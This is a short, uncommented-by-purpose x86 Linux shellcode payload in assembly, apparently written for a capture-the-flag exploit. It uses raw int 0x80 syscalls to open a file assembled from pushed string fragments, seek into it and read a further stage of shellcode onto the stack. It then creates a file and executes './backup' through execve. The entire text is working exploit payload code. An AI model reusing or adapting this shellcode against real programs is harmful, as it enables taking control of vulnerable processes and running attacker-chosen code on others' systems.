use32

size_sc_getkey = 118
;size_sc_getkey = 0x59

syscall_open = 5 ;long sys_open(const char __user *filename, int flags, int mode)
syscall_execve = 11 ; int kernel_execve(const char *filename, char *const argv[], char *const envp[])
syscall_read = 3 ; long sys_read(unsigned int fd, char __user *buf, size_t count)
syscall_lseek = 19 ; sys_lseek(unsigned int fd, off_t offset, unsigned int origin);

	;sub sp, 0x101
	add esp, 0xF
	inc esp
	;mov ebp, esp ; get filename
	
	; open
	push "ta//"
	push "./me"
	mov ebx, esp
	xor ecx, ecx
	mov cl, 2
	mov al, syscall_open
	int 0x80
	
	; shift 0xFF
	mov ebx, eax
	xor ecx, ecx
	mov cl, 0xFF
	; aleardy edx = 1
	mov al, syscall_lseek
	int 0x80
	
	; get sc
	sub sp, 0x401 ; :D
	;mov ebx, eax
	mov ecx, esp
	;inc esi
	mov dl, size_sc_getkey ; size sc + address
	mov al, syscall_read
	int 0x80
	
	; create file
	push "fo: "
	push "a/In"
	push "/met"
	mov ebx, esp
	xor ecx, ecx
	mov cl, 0x66
	;xor edx, edx
	mov dl, 0x7
	mov al, syscall_open
	int 0x80	
	
	;push "nfo/"
	;push "ta/I"
	;push "./me"
	;mov ebx, esp
	;xor ecx, ecx
	;mov cl, 0x7
	;mov al, syscall_creat
	;int 0x80
	
	
    cdq
    push edx
    push "ckup"
	push "./ba"
	mov ebx, esp
	cdq
	push edx
	push ebx
	mov ecx, esp
	mov al, syscall_execve
	int 0x80